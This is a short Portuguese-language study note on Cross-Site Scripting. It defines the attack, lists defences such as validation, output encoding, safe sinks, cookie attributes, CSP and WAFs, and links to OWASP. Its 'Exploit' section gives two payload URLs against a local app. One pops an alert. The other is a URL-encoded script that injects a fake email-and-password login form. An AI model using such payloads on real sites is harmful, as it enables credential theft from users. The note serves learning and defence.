# Cross Site Scripting (XSS)

Os ataques Cross-Site Scripting (XSS) são um tipo de injeção, na qual scripts maliciosos são injetados em sites benignos e confiáveis. Os ataques XSS ocorrem quando um invasor usa um aplicativo da Web para enviar código malicioso, geralmente na forma de um script do lado do navegador, para um usuário final diferente.

## Como proteger

- Garantir que todas as variáveis ​​passem por validação e sejam então escapadas ou higienizadas
- Codificar a saída quando você precisa exibir dados com segurança exatamente como um usuário os digitou
    - No javacritp procure utilizar metodos Safe Sink
- Outros controles (segurança em camadas)
    - Atributos de cookies
    - Política de segurança de conteúdo
    - Firewalls de aplicativos da Web (WAFs) 

## Exploit

http://127.0.0.1:3000/search?search=teste<script>alert('teste');</script>
http://127.0.0.1:3000/search?search=teste%3C%2Fp%3E%3Cscript%3Evar%20down%3Ddocument.getElementById(%22teste%22)%2Cform%3Ddocument.createElement(%22form%22)%3Bform.setAttribute(%22method%22%2C%22post%22)%2Cform.setAttribute(%22action%22%2C%22submit.php%22)%3Bvar%20EID%3Ddocument.createElement(%22input%22)%3BEID.setAttribute(%22type%22%2C%22text%22)%2CEID.setAttribute(%22name%22%2C%22emailID%22)%3Bvar%20PWD%3Ddocument.createElement(%22input%22)%3BPWD.setAttribute(%22type%22%2C%22password%22)%2CPWD.setAttribute(%22name%22%2C%22password%22)%3Bvar%20s%3Ddocument.createElement(%22input%22)%3Bs.setAttribute(%22type%22%2C%22submit%22)%2Cs.setAttribute(%22value%22%2C%22Submit%22)%2Cform.appendChild(EID)%2Cform.appendChild(PWD)%2Cform.appendChild(s)%3Bdown.appendChild(form)%3B%3C%2Fscript%3E

## Mais informações

https://owasp.org/www-community/attacks/xss/
https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html